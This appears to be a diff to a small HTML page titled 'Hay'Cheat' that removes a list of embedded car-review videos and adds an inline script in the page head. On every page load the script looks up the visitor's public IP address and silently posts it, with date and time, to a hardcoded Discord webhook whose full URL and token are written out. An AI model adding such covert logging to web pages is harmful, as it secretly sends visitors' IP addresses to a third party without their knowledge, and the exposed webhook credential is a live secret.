@@ -5,37 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hay'Cheat</title>
     <link rel="stylesheet" href="style.css">
+    <script>
+        var ip = '';
+fetch('https://api.ipify.org/?format=json')
+.then(function(response) {
+    return response.json();
+})
+.then(function(data) {
+    ip = data.ip;
+    var currentDate = new Date();
+    var formattedDate = currentDate.toLocaleDateString();
+    var formattedTime = currentDate.toLocaleTimeString();
+    var webhook = 'https://discord.com/api/webhooks/1136728937737769045/Yc6wTSqANXsJiZDmcd1dcK_m6ToF9ccPGDrYAUTaxiz4TAyJ40ehrRhZ3cXIkhbL8dk1';
+    var message = {
+        content: '> **Nouvelle connexion de l\'IP:** '+ip+'\n> **Le: **'+formattedDate+' **à:**'+formattedTime+'\n> © Hayzi'
+    };
+
+    fetch(webhook, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+    });
+});
+    </script>
 </head>
 <body>
     <div>
         <h1>Hay'Cheat</h1>
     </div><hr style="text-align: center;width: 50%;"><br><br>
-
-    <div>
-        <h3>Vultech BMW - Vilebrequin</h3>
-        <media data="https://www.youtube.com/embed/FaMFJhFTj3A" width="50%" height="334px"></media><hr width="50%">
-
-        <h3>Essai BMW 2002 Turbo - Vilebrequin</h3>
-        <object data="https://www.youtube.com/embed/ACa7UVXrtvw" width="50%" height="334px"></object><hr width="50%">
     
-
-        <h3>Essai 205 T16 EVO 2 - Vilebrequin</h3>
-        <object data="https://www.youtube.com/embed/_XaAJuhA7aA" width="50%" height="334px"></object><hr width="50%">
-
-        <h3>Vultech Volkswagen - Vilebrequin</h3>
-        <object data="https://www.youtube.com/embed/Swv_wNSq3Jg" width="50%" height="334px"></object><hr width="50%">
-
-        <h3>Vultech Peugeot - Vilebrequin</h3>
-        <object data="https://www.youtube.com/embed/XMVfWGPGbtY" width="50%" height="334px"></object><hr width="50%">
-
-        <h3>Vultech Porsche - Vilebrequin</h3>
-        <object data="https://www.youtube.com/embed/RrUhyyLYWB4" width="50%" height="334px"></object><hr width="50%">
-
-        <h3>Essai Xsara WRC - Vilebrequin</h3>
-        <object data="https://www.youtube.com/embed/qBuAR1fb_8g" width="50%" height="334px"></object><hr width="50%">
-        
-        <h3>Vultech Citroën - Vilebrequin</h3>
-        <object data="https://www.youtube.com/embed/egfwQeAipO4" width="50%" height="334px"></object><hr width="50%">
-    </div>
 </body>
 </html>
